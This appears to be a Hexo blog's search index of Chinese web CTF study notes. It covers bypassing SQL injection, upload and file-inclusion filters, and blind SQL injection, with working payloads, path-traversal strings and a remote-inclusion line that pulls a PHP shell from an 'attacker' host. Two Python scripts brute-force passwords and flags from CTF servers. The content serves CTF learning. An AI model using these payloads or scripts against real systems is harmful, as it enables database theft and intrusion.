<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[WEB-CTF中的绕过]]></title>
      <url>/2017/10/19/WEB-CTF%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>—  从零开始的笔记  —<br>— sql，上传，目录  —<br><a id="more"></a></p>
<hr>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
<li>url base64 utf-8… (全部编码或个别编码)</li>
<li>字符–&gt;char()  如：Test  –&gt; CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</li>
</ul>
<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><p>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin</p>
<h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3><p>SeLeT   不多解释</p>
<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
<li>两个空格代替一个空格，TAB代替空格</li>
<li>用注释符号代替空格 /**/</li>
<li>用括号代替空格 </li>
<li>用+代替空格  </li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="number">2</span>;   <span class="comment">---------&gt;   select(user())from dual where(1=1)and(2=2)</span></div><div class="line">利用函数完成猜解  如：  猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟</div><div class="line">	http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109))</div></pre></td></tr></table></figure>
<ul>
<li>select+user()  +代替空格  不是url编码空格的+而是直接的+</li>
</ul>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><ul>
<li>=用<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="external">like</a>代替</li>
<li>需要与零比较：<code>-1 or 1=1 and ord(substr(user(),1,1))-114</code></li>
</ul>
<h3 id="Mysql条件注释的利用-…"><a href="#Mysql条件注释的利用-…" class="headerlink" title="Mysql条件注释的利用  /! … /"></a>Mysql条件注释的利用  /<em>! … </em>/</h3><ul>
<li><strong>/<em>! … </em>/</strong>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
<li><strong>/<em>!50000select</em>/</strong>:50000版本以上的  不执行括号中的语句 ，必定执行，用于过滤正则表达式</li>
</ul>
<h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><ul>
<li><strong>limit ,</strong>中的<strong>,</strong> ：<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset</a></li>
<li>substr() mid()等函数中的<strong>,</strong> ：<code>select substr(database() from 1 for 1);</code></li>
</ul>
<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用十六进制可以绕过引号<br>如：”users” —&gt; 0x7573657273</p>
<h3 id="过滤-lt-与-gt"><a href="#过滤-lt-与-gt" class="headerlink" title="过滤&lt;与&gt;"></a>过滤&lt;与&gt;</h3><p>使用<a href="http://www.yiibai.com/sql/sql_function_greatest.html" target="_blank" rel="external">GREATEST()</a>绕过比较操作符。<br><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code> ——-&gt;<br><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p>
<h3 id="过滤sleep"><a href="#过滤sleep" class="headerlink" title="过滤sleep"></a>过滤sleep</h3><p><a href="http://blog.sina.com.cn/s/blog_778e18e90101a48h.html" target="_blank" rel="external">benchmark(x, y)</a><br>benchmark(1000,sha(1)) 1000次sha(1)，来时间延迟  </p>
<h3 id="过滤注释符号（-，–）"><a href="#过滤注释符号（-，–）" class="headerlink" title="过滤注释符号（#，–）"></a>过滤注释符号（#，–）</h3><ul>
<li>id=1’ union select 1,2,3||’1</li>
<li>id=1’ union select 1,2,’3</li>
</ul>
<h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>尝试宽字节    %bf%27 %df%27 %aa%27</p>
<h3 id="利用等价函数"><a href="#利用等价函数" class="headerlink" title="利用等价函数"></a>利用等价函数</h3><ul>
<li>hex()、bin() ==&gt; ascii()</li>
<li>sleep() ==&gt; benchmark()</li>
<li>concat_ws()==&gt; group_concat()</li>
<li>mid()、substr() ==&gt; substring()</li>
<li>@@user ==&gt; user()</li>
<li>@@datadir ==&gt; datadir()</li>
</ul>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>随便提几个基础的：</p>
<ul>
<li>文件名限制      1.php.jpeg 可以在服务端使用php格式打开执行</li>
<li>文件类型限制     burpsuite 修改image/jpeg</li>
<li>文件大小限制     修改信息文件限制大小参数</li>
<li>文件内容头部     修改文件内容头部<br>高端的，直接上<a href="http://blog.0kami.cn/2016/07/04/file-upload-vulnerability/" target="_blank" rel="external">0kami的博客</a> </li>
</ul>
<h2 id="文件包含及目录遍历"><a href="#文件包含及目录遍历" class="headerlink" title="文件包含及目录遍历"></a>文件包含及目录遍历</h2><p>两者应用相似，唯一不同就在于：前者是在url的<strong>参数</strong>中，后者是直接在url上</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>– 0字节 \x00<br>(magic_quotes_gpc=off PHP小于5.3.4)<br><code>../../../../../../etc/passwd%00</code></p>
<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd</code><br><code>////////////////////////passwd</code></p>
<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>(php版本小于5.2.8(?) 只适用windows 最后点号&gt;256)<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
<h3 id="远程文件包含中的"><a href="#远程文件包含中的" class="headerlink" title="远程文件包含中的?"></a>远程文件包含中的<strong>?</strong></h3><p>远程文件包含本身参数传递的就是url地址，末尾加个<strong>？</strong>会把之后的系统后台添加的字符串理解为无用参数<br><code>/?param=http://attacker/phpshell.txt?</code><br><code>require_once &#39;http://attacker/phpshell.txt?/action/m_share.php&#39;;</code></p>
<p>以上偷取葛大佬的部分栗子</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的sql盲注]]></title>
      <url>/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/</url>
      <content type="html"><![CDATA[<p>—从零开始的笔记—<br>—requests和脚本—<br><a id="more"></a></p>
<hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇包括sql盲注，以及调用requests库的基本python脚本编写</p>
<h2 id="sql盲注的原理"><a href="#sql盲注的原理" class="headerlink" title="sql盲注的原理"></a>sql盲注的原理</h2><p>上篇也大致提了一下sql盲注，以及分为<strong>布尔型盲注</strong>,<strong>时间型盲注</strong>。<br>实际上sql盲注也很简单，其实就是不直接显示搜索到的结果，而从其他方式来推断得出结果的sql注入。<br>举起个小栗子：</p>
<ul>
<li><strong>sql回显注入</strong> ：<br>  我问你叫什么名字，你回答你叫奥特曼。</li>
<li><strong>sql布尔型盲注</strong> ：<br>  我问你叫什么名字，你只会说是和不是(ture false)。<br>  于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。<br>  但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。</li>
<li><strong>sql时间型盲注</strong> ：<br>  我问你叫什么名字，无论对错，你只会 啊 的叫一声。<br>  于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。</li>
</ul>
<p>再类比成数据库查询，原理就是如此了。</p>
<h2 id="数据库盲注所用的函数"><a href="#数据库盲注所用的函数" class="headerlink" title="数据库盲注所用的函数"></a>数据库盲注所用的函数</h2><ul>
<li><a href="http://outofmemory.cn/code-snippet/1149/MySQL-if-case-statement-usage-summary" target="_blank" rel="external">if 和 case</a> 用于时间型盲注</li>
<li><a href="http://www.jb51.net/article/27458.htm" target="_blank" rel="external">substring()</a> 用于截断字符串</li>
<li><a href="http://www.bkjia.com/Mysql/625204.html" target="_blank" rel="external">ascii（）</a> 使字符变成ascii码（可以ascii码比较，也可直接字符比较）</li>
<li><a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset 与 limit</a> 用于查询到多条记录时选取第几条，再猜取内容，不然只会猜取第一条</li>
</ul>
<h2 id="sql盲注的步骤"><a href="#sql盲注的步骤" class="headerlink" title="sql盲注的步骤"></a>sql盲注的步骤</h2><h3 id="1-判断是否有盲注点"><a href="#1-判断是否有盲注点" class="headerlink" title="1.判断是否有盲注点"></a>1.判断是否有盲注点</h3><p><strong>布尔型盲注</strong>：布尔型盲注的注入点的表现并不绝对统一，只要当sql语句执行成功和失败的返回的页面存在某种固定差异，即存在布尔型盲注点。<br>所以可以尝试但不限于以下的语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回<span class="literal">true</span>的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回<span class="literal">false</span>的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' or '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回<span class="literal">true</span>的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' or '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回<span class="literal">false</span>的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">'1'</span> and <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
<p><strong>时间型盲注</strong>:基于布尔型的语句上，利用if或case加以区分使返回结果有区别<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= <span class="string">' or if('</span>1<span class="string">' = '</span>1<span class="string">',sleep(5),1) --+   (延迟返回为true)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">$name= '</span> or <span class="keyword">if</span>（<span class="string">'1'</span> = <span class="string">'2'</span>,sleep(5),1) --+  (不延迟返回为<span class="literal">false</span>，因为正确的概率低，节省时间)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">''</span> or <span class="keyword">if</span>(<span class="string">'1'</span> = <span class="string">'1'</span>,sleep(5),1) --+</div></pre></td></tr></table></figure></p>
<p>此处跟布尔型<strong>and</strong>和<strong>or</strong>的使用故意有所区分。<br>实际情况中当你构造不出一个数据库中有的name时，如果继续使用<code>$name= &#39; and if（&#39;1&#39; = &#39;1&#39;,sleep(5),1) --+</code></p>
<p><code>$name=&#39;&#39;</code> 语句执行已经为false，根据<strong>and的就近原则</strong>：当前有false时，不执行之后的句子<br>结果将永远不延迟。</p>
<p>于是就可以用<code>&#39; or if（&#39;1&#39; = &#39;1&#39;,sleep(5),1) --+</code></p>
<hr>
<p>接下来<br>一般跳过<strong>判断select语句有几列</strong>，<strong>判断显示的信息在第几列</strong>环节，<br>因为盲注一般不用union select查询，并且没有显示信息。</p>
<h3 id="2-利用函数来搜集信息"><a href="#2-利用函数来搜集信息" class="headerlink" title="2.利用函数来搜集信息"></a>2.利用函数来搜集信息</h3><p>用户：user()<br>当前数据库：database()<br>数据库版本：version()<br>@@hostname （用户）<br>@@datadir   (数据库在文件的位置)<br>@@version  （版本)<br>@@version_compile_OS  (操作系统版本)</p>
<p><strong>布尔型:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or select substring(user(),1,1) ='</span>r<span class="string">' --+  #截取第一位开始的一个</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' or select substring(user(),1,1) ='</span>r<span class="string">' --+'</span></div></pre></td></tr></table></figure></p>
<p>盲注查询的基本套路：截取，是否相等，相等=ture页面，不相等=false页面<br>替换r，直到ture页面<br>再substring( 巴拉巴拉 , 2 , 1 ),如此反复</p>
<p><strong>时间型:</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or  if( (select substring( user(),1,1 )='</span>r<span class="string">'),sleep(0.5),1) --+   #截取第一位开始的一个 </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' or  if( (select substring( user(),1,1 )='</span>r<span class="string">'),sleep(0.5),1) --+'</span></div></pre></td></tr></table></figure>
<p><strong>此处说明sleep（0.5）</strong>：说是睡0.5秒实际上是 表中除了name=’’以外的记录数×0.5秒</p>
<p>此句中的sleep()语句会跟 or还是and 以及 select主句中查询的记录数 有关。<br>具体情况自己可以在mysql中试验。</p>
<p>实际操作中写的数值大就好，因为我们会根据timeout时间超时来判断，超时–&gt;正确；不超时–&gt;错误。</p>
<h3 id="3-猜解库，表，列"><a href="#3-猜解库，表，列" class="headerlink" title="3.猜解库，表，列"></a>3.猜解库，表，列</h3><p><strong>布尔型</strong>：用字典文件替换db,table,column,如果不存在，返回false界面；存在，返回true界面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and column is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span><span class="string">' and column is not null -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and table.user is not null --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> and db.table.user is not null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and (select count(*) from db.table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure></p>
<p><strong>时间型</strong>：用字典文件替换db,table,column,如果不存在，立即返回；存在，超时。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (column is not null),sleep(5),1) --+  </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span>1<span class="string">' and if( (column is not null),sleep(0.5)&amp;1,1) -- '</span></div><div class="line"></div><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (table.column is not null),sleep(5),1) --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (db.table.column is not null),sleep(5),1) --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select count(*) from table)&gt;0 ,sleep(5),1)--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">5.4.猜解其他数据库的表和列 （如果三者都不知道这种查询只能同时猜三个变量）</span></div><div class="line"><span class="string">$name='</span> and <span class="keyword">if</span>( (select count(*) from db.table)&gt;0 ,sleep(5),1) --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure>
<h3 id="4-从information-schema中读取列，表，库"><a href="#4-从information-schema中读取列，表，库" class="headerlink" title="4.从information_schema中读取列，表，库"></a>4.从information_schema中读取列，表，库</h3><p>如果有访问information_schema的权限，当然可以从中读取。<br>此处列出时间型的小栗子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1.读取列名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(column_name,1,1) from information_schema.columns limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">2.读取表名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (select substring(table_name,1,1) from information_schema.tables  <span class="built_in">limit</span> 1 offset 0 )=<span class="string">'A'</span> ,sleep(5),1)--+  </div><div class="line"></div><div class="line">3.读取库名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(table_schema,1,1) from information_schema.tables group by table_schema limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">4.读取表的库名</span></div><div class="line"><span class="string">$name=1'</span> and <span class="keyword">if</span>( (select substring(table_schuma,1,1) from information_schema.tables <span class="built_in">where</span> table_name=<span class="string">'XXXX'</span>  <span class="built_in">limit</span> 1 offset 0 )=<span class="string">'A'</span> ,sleep(5),1)--+  </div><div class="line"></div><div class="line">5.读取列的库名</div><div class="line"><span class="variable">$name</span>=1<span class="string">' and if( (select substring(table_name,1,1) from information_schema.columns where column_name='</span>XXXX<span class="string">'  limit 1 offset 0 )='</span>A<span class="string">' ,sleep(5),1)--+</span></div></pre></td></tr></table></figure></p>
<p>布尔型的就以此类推，不再写了吧。</p>
<h3 id="5-猜解FLAG"><a href="#5-猜解FLAG" class="headerlink" title="5.猜解FLAG"></a>5.猜解FLAG</h3><p>可用select：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' union select  ascii(substring(flag,1,1)) from flag ='</span>102    ------&gt;ascii匹配</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' union select  substring(flag,1,1) from flag ='</span>A<span class="string">'            ------&gt;字符匹配</span></div></pre></td></tr></table></figure></p>
<p>不好select的情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=<span class="string">' or column = '</span>admin  -----&gt; 内容精准</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' or column like '</span>%a%  -----&gt;  模糊查找</div></pre></td></tr></table></figure></p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>给出个说明较好的盲注实例 <a href="http://blog.csdn.net/pygain/article/details/53086389" target="_blank" rel="external">戳这里=w=</a></p>
<h2 id="requests与脚本"><a href="#requests与脚本" class="headerlink" title="requests与脚本"></a>requests与脚本</h2><p>盲注的手动注入不现实，burpsuite也不是很方便，学习用py脚本来盲注。<br>需要requests库，<a href="docs.python-requests.org/zh_CN/latest/user/quickstart.html">使用说明</a>。<br>贴上两道题目的解题的代码，加上注释，看着学习把。(题目访问url)</p>
<h3 id="布尔型脚本"><a href="#布尔型脚本" class="headerlink" title="布尔型脚本"></a>布尔型脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url=<span class="string">"http://58.154.33.13:8002/login.php"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#判断表</span></div><div class="line">sql_table=<span class="string">"admin' and (select password from table)&gt;0"</span>  <span class="comment">#替换table 得到 admin</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'and (select substring(password,%s,1) from admin)='%s' #"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</div><div class="line">	response=requests.post(url,data=data)</div><div class="line">	<span class="keyword">if</span> response.content.decode(<span class="string">'utf-8'</span>).find(<span class="string">'密码错误'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += x</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
<h3 id="时间型脚本"><a href="#时间型脚本" class="headerlink" title="时间型脚本"></a>时间型脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/5/index.php"</span></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"><span class="comment">#判断列    通过 错误 以及  返回固定页面（正确）   ------&gt; user pw</span></div><div class="line">sql_column=<span class="string">"' or  column is not null"</span></div><div class="line"><span class="comment">#判断表    通过 错误 以及  返回固定页面（正确）   ------&gt;  php</span></div><div class="line">sql_table=<span class="string">"' or select pw from table"</span></div><div class="line"><span class="comment">#判断数据</span></div><div class="line">sql_data=<span class="string">"' or if(substring((select pw from php limit 1),%d,1)=%s,sleep(5),0) #"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'user'</span>:sql_data %(i,x),<span class="string">'pass'</span>:<span class="string">'123'</span>&#125;</div><div class="line">	starttime=time.time()</div><div class="line">	s=requests.post(url,data=data)</div><div class="line">	<span class="keyword">if</span> time.time()-starttime &gt;<span class="number">5</span> :    <span class="comment">#post下 尝试用timeout参数失败，于是改用此方法来判定超时</span></div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="comment">#print(i,x)</span></div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += x</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ZJGSCTF_writeup]]></title>
      <url>/2017/09/18/ZJGSCTF_writeup/</url>
      <content type="html"><![CDATA[<p>——<a href="http://121.42.189.18" target="_blank" rel="external">ZJGSCTF</a>——-<br>——持续更新中——-<br><a id="more"></a></p>
<h2 id="9-7-综合题"><a href="#9-7-综合题" class="headerlink" title="[9-7]综合题"></a>[9-7]综合题</h2><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="涉及范围：编码及Linux"><a href="#涉及范围：编码及Linux" class="headerlink" title="涉及范围：编码及Linux"></a>涉及范围：编码及Linux</h3><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdknuoc8j30ld08haaa.jpg" alt="9-7.1"></p>
<p>页面乱码，猜测是一种编码方式，由 [ ] ! + ( ) { } 组成<br>参考 <a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external">编码与加密</a><br>得出是jsfuck编码，百度 <a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">在线解码</a><br>解码得出：1bc29b36f623ba82aaf6724fd3b16718.php<br>原地址去掉index.php，加上1bc29b36f623ba82aaf6724fd3b16718.php，访问</p>
<p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrdl9bvqvj30pr0453yf.jpg" alt="9-7.2"></p>
<p>脑袋,猜测地址1bc29b36f623ba82aaf6724fd3b16718.php的前部分32位为MD5编码<br>对其试解码得：MD5<br>考虑原地址b0b0ad119f425408fc3d45253137d33d为MD5解码，解码失败。<br>再进行了访问MD5.php等方法，无果，有点无从下手。<br>退档重新思考，再看提示，发现掉坑里，tip在我脑袋里应该是指包的头部，burpsuite抓包发现<strong>tip</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjrdljievpj30dd03fwei.jpg" alt="9.7.3"></p>
<p>百度 <a href="http://blog.csdn.net/chinalinuxzend/article/details/1849419" target="_blank" rel="external">history of bash</a><br>于是访问 <strong>./.bash_history</strong></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdlsuefkj30640110fx.jpg" alt="9-7.4"></p>
<p>有过一次压缩文件命令，访问 <strong>./flagbak.zip</strong><br>下载解压，得到flag</p>
<h2 id="8-31-水能载舟亦可赛艇"><a href="#8-31-水能载舟亦可赛艇" class="headerlink" title="[8-31]水能载舟亦可赛艇"></a>[8-31]水能载舟亦可赛艇</h2><p><a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="external">戳这里=w=</a></p>
